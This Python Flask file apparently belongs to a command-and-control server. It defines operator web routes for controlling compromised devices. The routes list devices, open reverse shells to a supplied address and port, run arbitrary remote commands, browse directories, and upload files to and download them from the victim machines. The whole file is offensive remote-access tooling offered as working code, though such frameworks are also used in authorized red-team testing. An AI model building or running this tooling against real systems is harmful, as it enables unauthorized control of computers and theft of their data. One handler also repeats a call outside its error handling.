from flask import (
    Blueprint,
    render_template,
    jsonify,
    flash,
    redirect,
    send_file,
    request)
from Utils.web import generate_response, authorized
from Database import db_session, DeviceModel
from Commander.commander import Commander


def devices_bp(server: Commander):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @authorized
    def get_devices_index():
        use_json = request.args.get("json", "").lower() == "true"
        devices: list[DeviceModel | None] = db_session.query(DeviceModel).all()
        if use_json:
            return jsonify([device.to_json(server) for device in devices])
        return render_template("devices.html", devices=devices)

    @devices_bp.route("/reverse_shell", methods=["POST"])
    @authorized
    def post_reverse_shell():
        device_id = request.args.get("id")
        address = request.form.get("address")
        port = request.form.get("port")

        if not device_id.isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)

        try:
            server.get_active_handler(device_id).reverse_shell(address, port)
        except Exception as e:
            return generate_response("error", str(e), "listeners", 500)
        else:
            return generate_response("success", "Reverse Shell opened.", "listeners")

    @devices_bp.route("/rce", methods=["POST"])
    @authorized
    def post_rce():
        device_id = request.args.get("id")
        cmd = request.form.get("cmd")

        if not device_id .isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)

        try:
            output = server.get_active_handler(device_id).rce(cmd)
        except Exception as e:
            return generate_response("error", str(e), "listeners", 500)
        else:
            return generate_response("success", output, "listeners")

    @devices_bp.route("/info", methods=["GET"])
    @authorized
    def get_infos():
        device_id = request.args.get("id", "")

        if not device_id .isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)

        output = server.get_active_handler(device_id).infos()
        try:
            output = server.get_active_handler(device_id).infos()
        except Exception as e:
            return generate_response("error", str(e), "listeners", 500)
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/dir", methods=["GET"])
    @authorized
    def get_dir():
        device_id = request.args.get("id", "")
        dir = request.args.get("dir")

        if not device_id .isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)
        try:
            output = server.get_active_handler(
                device_id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices_bp.route("/upload", methods=["POST"])
    @authorized
    def post_upload():
        device_id = request.args.get("id")
        remote_path = request.args.get("path")
        if not device_id.isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)
        # check if file is in request
        if not "file" in request.files:
            return generate_response("error", "The as_file parameter is true, but no file was given.", "devices", 400)
        if remote_path is None:
            return generate_response("error", "Upload path is missing.", "devices", 400)
        try:
            output = server.get_active_handler(
                device_id).file_upload(request.files.get('file'), remote_path)
        except Exception as e:
            return generate_response("error", str(e), "devices", 500)
        else:
            return generate_response("success", output, "devices")

    @devices_bp.route("/download", methods=["GET"])
    @authorized
    def get_download():
        device_id = request.args.get("id", "")
        remote_path = request.args.get("path")
        if not device_id .isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)
        if remote_path is None:
            return generate_response("error", "File path is missing.", "devices", 400)
        try:
            file = server.get_active_handler(
                device_id).file_download(remote_path)
        except Exception as e:
            return generate_response("error", str(e), "/devices", 500)
        else:
            return send_file(file)
    return devices_bp
